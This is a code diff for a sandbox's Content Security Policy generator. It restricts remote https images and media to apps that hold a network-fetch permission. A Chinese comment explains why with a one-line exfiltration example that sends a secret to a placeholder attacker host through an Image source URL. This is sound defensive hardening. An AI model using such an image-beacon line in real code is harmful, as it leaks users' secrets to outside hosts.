@@ -87,6 +87,21 @@ export interface GenerateCSPOptions {
    * Default true — engines and physics libs commonly need this.
    */
   allowWasm?: boolean
+  /**
+   * Allow `img-src` / `media-src` to load from arbitrary `https:` origins.
+   *
+   * Granted when the installation has `network:fetch`.
+   *
+   * 为什么要用权限门控：`connect-src 'none'` 封掉了 fetch/XHR/WS，但
+   * `img-src https:` 是一条同样好用的**单向外泄通道** ——
+   * `new Image().src = 'https://attacker/?d=' + secret` 就够了，不需要读响应。
+   * 过去它对所有 Tapp 默认开启，于是"沙箱禁止联网"实际上并不成立。
+   *
+   * 现在默认只允许 data:/blob:/宿主同源；确实需要加载远端图片或媒体的 Tapp
+   * 声明 `network:fetch` —— 那本来就是一个用户可见、需要授权的联网能力，
+   * 不会凭空多出攻击面。
+   */
+  allowRemoteMedia?: boolean
 }
 
 /**
@@ -115,6 +130,7 @@ export function generateCSP(
 ): string {
   const allowMediaBlob = options.allowMediaBlob === true
   const allowWasm = options.allowWasm !== false
+  const allowRemoteMedia = options.allowRemoteMedia === true
 
   // 🔒 script-src: 仅 nonce（+ 可选 wasm）。不放行任何外部脚本 host——
   // host 白名单允许通过 <script src="https://host/?data"> 的 query 外泄数据。
@@ -123,15 +139,21 @@ export function generateCSP(
     ? `script-src 'nonce-${nonce}'${wasmPart}`
     : `script-src 'unsafe-inline'${wasmPart}`
 
-  // Tapp 按受信任应用处理：允许公开 HTTPS 图片直接加载。
-  // 显式宿主源兼容本地 HTTP 开发环境与包内资源。
-  // Federation Note 附件（/media/federation/*）与远程 https 媒体也需能在时间线播放。
+  // 图片/媒体源。
+  //
+  // 默认只放行 data:/blob:/宿主同源 —— 宿主源覆盖包内资源、`/api/proxy/image`
+  // 与 Federation Note 附件（`/media/federation/*`），本地 HTTP 开发环境也走这里。
+  // 裸 `https:` 是一条外泄通道（见 GenerateCSPOptions.allowRemoteMedia），
+  // 只在 Tapp 声明了 network:fetch 时才追加。
   const origin = hostOrigin()
-  const imgSrc = `img-src data: blob: https:${origin ? ` ${origin}` : ''}`
-  // video/audio: 始终允许 https + 宿主同源；blob/data 仅在 media:audio 授权时放行
+  const originPart = origin ? ` ${origin}` : ''
+  const remotePart = allowRemoteMedia ? ' https:' : ''
+
+  const imgSrc = `img-src data: blob:${remotePart}${originPart}`
+  // video/audio: blob/data 仅在 media:audio 授权时放行
   const mediaSrc = allowMediaBlob
-    ? `media-src data: blob: https:${origin ? ` ${origin}` : ''}`
-    : `media-src https:${origin ? ` ${origin}` : ''}`
+    ? `media-src data: blob:${remotePart}${originPart}`
+    : `media-src${remotePart}${originPart}${remotePart || originPart ? '' : " 'none'"}`
 
   const directives = [
     scriptSrc,
@@ -159,6 +181,8 @@ export function cspOptionsFromPermissions(
   return {
     allowMediaBlob: grantedPermissions?.includes('media:audio') === true,
     allowWasm: true,
+    // 远端 https 图片/媒体挂在已有的联网权限下，而不是对所有 Tapp 默认开启
+    allowRemoteMedia: grantedPermissions?.includes('network:fetch') === true,
   }
 }
 
@@ -180,9 +204,15 @@ export function cspOptionsFromPermissions(
  * 6. 图片 URL 白名单与 CSP img-src 对齐（尽早报错，非边界）
  *
  * @param sessionToken 会话 token，用于消息验证
+ * @param allowRemoteMedia 是否放行远端 https 图片（须与 generateCSP 的同名选项一致，
+ *        否则这里的提示会与实际被 CSP 拦截的结果对不上）
  */
-export function generateSecurityWrapper(sessionToken: string): string {
+export function generateSecurityWrapper(
+  sessionToken: string,
+  allowRemoteMedia = false,
+): string {
   const origin = hostOrigin()
+  const allowRemote = allowRemoteMedia === true
   return `
 (() => {
   'use strict';
@@ -357,15 +387,17 @@ export function generateSecurityWrapper(sessionToken: string): string {
   window.SharedWorker = class { constructor() { throw new Error('SharedWorker is disabled in Tapp sandbox'); } };
   
   // 图片 URL 白名单：与 CSP img-src 对齐。
-  // 允许 HTTPS、data:、blob:、宿主同源与宿主相对路径。
+  // 默认允许 data:、blob:、宿主同源与宿主相对路径；
+  // 裸 https: 只有在 Tapp 声明 network:fetch 时才放行（否则它是外泄通道）。
   const _HOST_ORIGIN = '${origin}';
+  const _ALLOW_REMOTE_MEDIA = ${allowRemote};
   const _isAllowedImageUrl = (value) => {
     if (typeof value !== 'string') return true;
     const v = value.trim();
     if (!v) return true;
     const lower = v.toLowerCase();
     if (lower.startsWith('data:') || lower.startsWith('blob:')) return true;
-    if (lower.startsWith('https://')) return true;
+    if (_ALLOW_REMOTE_MEDIA && lower.startsWith('https://')) return true;
     // Host-origin only (align with CSP img-src). Relative // is protocol-relative → blocked.
     if (_HOST_ORIGIN) {
       const host = _HOST_ORIGIN.toLowerCase();
